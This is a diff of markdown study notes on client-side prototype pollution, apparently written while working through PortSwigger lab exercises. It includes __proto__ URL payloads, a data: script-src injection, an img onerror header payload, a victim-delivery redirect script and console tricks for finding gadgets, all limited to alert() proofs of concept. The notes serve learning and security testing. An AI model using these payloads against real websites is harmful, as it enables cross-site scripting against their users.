@@ -626,68 +626,224 @@ If bypassed, the script will be added to the page and the payload can be modifie
 
 Prototype pollution gadgets may occur in third-party libraries imported in. If so, it is recommended to use DOM Invader to identify sources and gadgets. It will be much quicker and ensure you won't miss vulnerabilities that may be tricky to notice.
 
+DOM Invader checks the page for sources that allow you to add arbitrary properties to built-in prototypes. For example, it may identify potential techniques. If so, try testing the payload and check if it works via the Console:
 
+![[DOM Invader PP PoC.png]]
 
+Try creating a new object and checking if it inherits the test property:
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Client-Side Prototype Pollution - Third-Party Libraries
-
-Use DOM Invader to exploit these scenarios as it will save a lot of time. DOM Invader is straight forward to use. Look at the solution for the following lab to learn more about it - [https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
-# Client-Side Prototype Pollution - Browser APIs
-
-Identify a prototype pollution source by injecting an arbitrary property via a query string and determine if it has polluted the Object prototype.
-
-- `/?__proto__.foo=bar`
-- `/?__proto__[foo]=bar`
-
-Type the following in the browser console and see if the Object has been polluted:
-
-- `Object.prototype`
-
-Identify a gadget by looking through the client-side source code and identify if there is an Object using a property in an insecure way. For example, the code is using the method Object.defineProperty() to define the property "transport_url", however, the "value" descriptor which is used to define the value associated with the property is not being defined:
-
-```javascript
-Object.defineProperty(config, 'transport_url', {
-	configurable: false,
-	writable: false
-	// missing -> value: "test"
-});
+```js
+let myObject = {}
+myObject.testproperty
 ```
 
-The "config" Object is not defining the "value" descriptor for "transport_url" property, we can try to pollute the Object prototype with the "value" property containing a malicious payload.
+![[Test Property.png]]
 
->[!info]
->https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty
+If it all works, try scanning for gadgets and check for any identified sinks and try checking the stack trace and the JavaScript file. Try exploiting it automatically and check it works. If so, try delivering it to the victim such as:
 
-To craft an exploit:
+```html
+<script>
+location = "https://0a3700fa035c3df1818ac503001d0083.web-security-academy.net/#__proto__[hitCallback]=alert%281%29";
+</script>
+```
 
-- `/?__proto__[value]=data:,alert(1);`
-- `/?__proto__.value=data:,alert(1);`
+For manual methods, try adding properties via the URL by using a query string or a hash string:
+
+```js
+#__proto__.foo=bar
+```
+
+And try querying the object prototype:
+
+```js
+Object.prototype
+```
+
+If no success, try different syntax:
+
+```js
+#__proto__[foo]=bar
+```
+
+![[Source Identified.png]]
+
+If successful, try finding a gadget - any property that is passed into a sink without proper sanitization by looking at the JavaScript files the app uses. Look through the files one by one. For example, there may be a function that is used to add properties to the "Ua" object:
+
+![[Function VA.png]]
+
+There may be various properties like anonymizeIp, currencyCode, title, etc... Try testing the properties one by one and check if they are passed to a sink such as eval() by intercepting responses in Burp, refreshing the page and intercepting the response loading the JavaScript file.
+
+Try adding a debugger statement such as:
+
+```html
+<script>
+debugger;
+</script>
+```
+
+![[Script Debugger.png]]
+
+This pauses execution. Try executing the following code in the console that defines a getter for the property on the Object.prototype. When the script tries to access the property on any object, the getter function is executed which logs a trace to the console and returns a string:
+
+```js
+Object.defineProperty(Object.prototype, 'hitCallback', {
+    get() {
+        console.trace();
+        return 'polluted';
+    }
+})
+```
+
+If no stack trace appears, it means it was never accessed. Repeat the test for every property until the console returns an error. Check the stack trace and analyse the JavaScript lines such as:
+
+![[Var Vc.png]]
+
+The `tc` is set to `hitCallback`. The `a.get(tc)` now returns polluted meaning the setTimeout is being called with polluted as the first argument instead of a function. To fix it, change the getter to return a function instead of a string:
+
+```js
+Object.defineProperty(Object.prototype, 'hitCallback', {
+    get() {
+        console.trace();
+        return alert();
+    }
+})
+```
+# Prototype Pollution in Browser APIs
+
+The `Fetch` API provides a simple way for devs to trigger HTTP requests using JavaScript. The `fetch()` method accepts two arguments - URL to send the request to and an options object to control parts of the request like method, headers, body parameters.
+
+An example is:
+
+```js
+fetch('https://normal-website.com/my-account/change-email', {
+    method: 'POST',
+    body: 'user=carlos&email=carlos%40ginandjuice.shop'
+})
+```
+
+The method and body properties are defined, with more left undefined. If an attacker can find a suitable source, they can pollute Object.prototype with a malicious headers property which may be inherited by the options object passed into `fetch()` and subsequently used to generate the request.
+
+As an example, the code may be vulnerable to DOM XSS:
+
+```js
+fetch('/my-products.json',{method:"GET"})
+    .then((response) => response.json())
+    .then((data) => {
+        let username = data['x-username'];
+        let message = document.querySelector('.message');
+        if(username) {
+            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
+        }
+        let productList = document.querySelector('ul.products');
+        for(let product of data) {
+            let product = document.createElement('li');
+            product.append(product.name);
+            productList.append(product);
+        }
+    })
+    .catch(console.error);
+```
+
+To exploit it, they could pollute Object.prototype with a header property containing a malicious `x-username` header as follows:
+
+```js
+`?__proto__[headers][x-username]=<img/src/onerror=alert(1)>`
+```
+
+The header may be used to set the value of the `x-username` property in the returned JSON. In the client-side code above, it is then assigned to the `username` variable, later passed into the `innerHTML` sink resulting in DOM XSS.
+
+Devs may attempt to block potential gadgets using `Object.defineProperty()` method which allows you to set a non-configurable, non-writeable property directly on the affected object:
+
+```js
+Object.defineProperty(vulnerableObject, 'gadgetProperty', {
+    configurable: false,
+    writable: false
+})
+```
+
+The `Object.defineProperty()` method accepts an options object known as a descriptor. Devs can use the descriptor object to set an initial value for the property being defined. If the only reason they are defining the property is to protect against prototype pollution, they may not set a value at all.
+
+If so, an attacker can bypass it by polluting `Object.prototype` with a malicious `value` property. If inherited by the descriptor objected passed to `Object.defineProperty`, the attacker value is assigned to the gadget property.
+
+For a full example, try polluting using a URL query parameter:
+
+```js
+/?__proto__.foo=bar
+```
+
+And query the object prototype:
+
+```js
+Object.prototype
+```
+
+If no success, try different syntax:
+
+```js
+/?__proto__[foo]=bar
+```
+
+![[FooBar2.png]]
+
+If found, identify every property used by the app by analysing JavaScript files. There may be a transport URL or other property with a defined value of "false".
+
+![[Transport URL False.png]]
+
+If the object prototype is polluted with a transport_url property, the config object will not inherit it as it already has its own property with the same name:
+
+![[Config False.png]]
+
+The `object.DefineProperty` method may be in use that makes the transport_url property on the config object unwriteable and unconfigurable. It defines a new property on an object or modifies an existing property.
+
+It takes three parameters:
+
+1. Object on which to define the property
+2. Property to be defined or modified
+3. Descriptor object for the property
+
+A `data` descriptor has an optional key name `value`. If defined, the value of the defined property will be changed to the new value. For example, a property may be defined as false - try adding the value property to the descriptor object and set it to true:
+
+```js
+let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
+Object.defineProperty(config, 'transport_url', {value: true, configurable: false, writable: false});
+```
+
+![[Let Config.png]]
+
+It changes to true meaning you can pollute the object prototype with a value property and override the value of `transport_url`. When `object.property` is called, the `descriptor` object, not having a value property defined, inherits the value property from the object prototype, overwriting the value of `transport_url`.
+
+![[Transport URL.png]]
+
+Try injecting an arbitrary value:
+
+```js
+/?__proto__[value]=polluted
+```
+
+If `config` has a property named transport_url, a script element is created and its source attribute is set to the value of the `transport_url` property - i.e. polluted - and appended to the body of the HTML document. Try injecting a payload inside script src such as:
+
+```js
+/?__proto__[value]=data:text/javascript,alert()
+```
+# Server-Side Prototype Pollution
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # Server-Side Prototype Pollution - Priv Esc
 
 Identify functionality on the application where JSON data is returned in a response that appears to represent your "User" Object. An example response:
